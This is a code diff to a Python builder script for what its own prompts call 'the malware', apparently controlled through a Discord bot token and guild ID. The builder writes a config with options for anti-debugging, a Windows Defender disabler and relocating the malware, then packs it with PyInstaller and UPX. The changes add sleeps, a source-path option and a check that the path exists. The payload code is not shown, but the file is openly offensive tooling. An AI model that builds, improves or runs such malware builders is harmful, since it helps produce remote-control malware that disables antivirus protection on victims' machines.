@@ -1,7 +1,8 @@
 import subprocess
-#import os
+import os
 from colorama import Fore, Style
 import sys
+import time
 
 
 def build(icon, file, upx):
@@ -13,6 +14,7 @@ def build(icon, file, upx):
             print(Fore.GREEN +"[+] All done!"+ Style.RESET_ALL)
         except:
             print(Fore.RED +"[-] Please make sure you have pyinstaller and UPX installed under C:/UPX!"+ Style.RESET_ALL)
+            time.sleep(3)
             sys.exit(1)
     else:
         try:
@@ -21,6 +23,7 @@ def build(icon, file, upx):
             print(Fore.GREEN +"[+] All done!"+ Style.RESET_ALL)
         except:
             print(Fore.RED +"[-] Please make sure you have pyinstaller installed!"+ Style.RESET_ALL)
+            time.sleep(3)
             sys.exit(1)
 
 
@@ -31,12 +34,18 @@ def convert(value, name):
         return False
     else:
         print(Fore.RED +f"[-] Choice for {name} is invalid, please enter 'y' for yes or 'n' for no!"+ Style.RESET_ALL)
+        time.sleep(3)
         sys.exit(0)
 
-def config(token, guild_id, interval, error, antidebug, defender, move):    
+def config(path, token, guild_id, interval, error, antidebug, defender, move):    
     config = f"TOKEN = '{token}'\nGUILD_ID = '{guild_id}'\nINTERVAL = {interval}\nERROR = {error}\nANTIDEBUG = {antidebug}\nDEFENDER = {defender}\nMOVE = {move}"
     
-    with open("src\config.py", "w") as f:
+    if not os.path.exists(path):
+        print(Fore.RED +f"[-] Please make sure you have source code under '{path}' folder relative to builder or edit building options!"+ Style.RESET_ALL)
+        time.sleep(3)
+        sys.exit(1)
+    
+    with open(f"{path}\config.py", "w") as f:
         f.write(config)
 
 
@@ -49,9 +58,6 @@ defender = input("[?] Enable win defender disabler? [Y/n]: ")
 move = input("[?] Move the malware to the special location? [Y/n]: ")
 
 
-config(token, guild_id, interval, convert(error, "error"), convert(antidebug, "antidebug"), convert(defender, "defender disabler"), convert(move, "move"))
-
-
 choice = input("> Do you want to edit building options[y/N]: ")
 if choice.lower() == "y":
     upx = input("[?] Use UPX? [Y/n]: ")
@@ -61,13 +67,20 @@ if choice.lower() == "y":
         upx = False
     else:
         print(Fore.RED +"[-] Your choice was invalid, please enter 'y' for yes or 'n' for no!"+ Style.RESET_ALL)
+        time.sleep(3)
         sys.exit(0)
         
     icon = input("[?] Enter icon file: ")
-    file = input("[?] Enter python source file: ")
-    build(icon, file, upx)
+    path = input("[?] Enter source code directory: ")
+    
+    config(path, token, guild_id, interval, convert(error, "error"), convert(antidebug, "antidebug"), convert(defender, "defender disabler"), convert(move, "move"))
+    build(icon, f"{path}\main.py", upx)
+    
 elif choice.lower() == "n":
+    config("src", token, guild_id, interval, convert(error, "error"), convert(antidebug, "antidebug"), convert(defender, "defender disabler"), convert(move, "move"))
     build("icon.ico", "src\main.py", True)
+    
 else:
     print(Fore.RED +"[-] Your choice was invalid, please enter 'y' for yes or 'n' for no!"+ Style.RESET_ALL)
-    
+    time.sleep(3)
+    sys.exit(0)
